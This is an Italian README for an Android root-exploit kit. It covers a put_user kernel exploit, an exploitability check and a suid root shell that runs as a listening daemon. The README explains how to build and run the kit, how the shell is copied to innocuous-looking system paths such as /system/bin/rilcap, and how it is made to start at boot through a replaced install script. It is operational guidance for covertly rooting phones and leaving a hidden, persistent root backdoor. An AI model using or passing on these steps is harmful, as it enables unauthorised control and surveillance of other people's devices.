###### Contenuto ######

- put_user_exploit: contiene l'exploit
- suidext: contiene la nuova shell da utilizzare in caso di SELinux abilitato
- utils: librerie varie
- headers: include necessari per la compilazione
- old_suidext: vecchia shell per Android <= 4.1.1

###### Configurazione #####

La configurazione della shell di root è descritta in headers/shell_params.h

 - SHELL_PORT: porta su cui il servizio root andrà in ascolto e su cui la parte client si connetterà
 - ROOT_SERVER: path in cui verrà copiato il binario avviato come servizio (di default l'avrei messo in /system/bin/event_handlerd)
 - ROOT_CLIENT: path in cui verrà copiato il binario da usare come client (solitamente /system/bin/rilcap)
 - INSTALL_SCRIPT: script di avvio al boot
 - INSTALL_SCRIPT_BAK: copia del binario da sostituire


Per avere i log a disposizione tramite logcat editare il file headers/log.h commentando opportunamente "#define DEBUG"


###### Compilazione ######
Compilare con il comando "build.sh" e non direttamente tramite ndk-buid.
Vengono creati i seguenti file:

 - selinux_exploit: l'exploit basato su put_user
 - selinux_suidext: la nuova shell che comprende sia il daemon, sia il client
 - selinux_check: esegue un check sull'exploitabilità del device. Restituisce 1 in caso di exploitabilità, 0 altrimenti.
 - runner: è il binario che lancia il demone di root. E' integrato direttamente in suidext.
 - suidext: shell suid vecchia per Android <= 4.1


###### Esecuzione #######

*** EXPLOIT ***

Deve essere lanciato passando due argomenti:

     - argv[1]: path assoluto alla nuova shell
     - argv[2]: path assoluto alla vecchia shell

L'exploit installerà automaticamente la shell vecchia se possibile o la shell nuova in base alle rilevazioni effettuate sul device.
Se l'exploit ha successo /system/bin/rilcap sarà presente ed utilizzabile in modo trasparente.

*** SHELL ***

Per avviare la shell in modalità daemon eseguire "suidext --daemon" oppure eseguire "suidext rt" che avvierà direttamente il demone.
Il client rispetta le specifiche della vecchia shell.
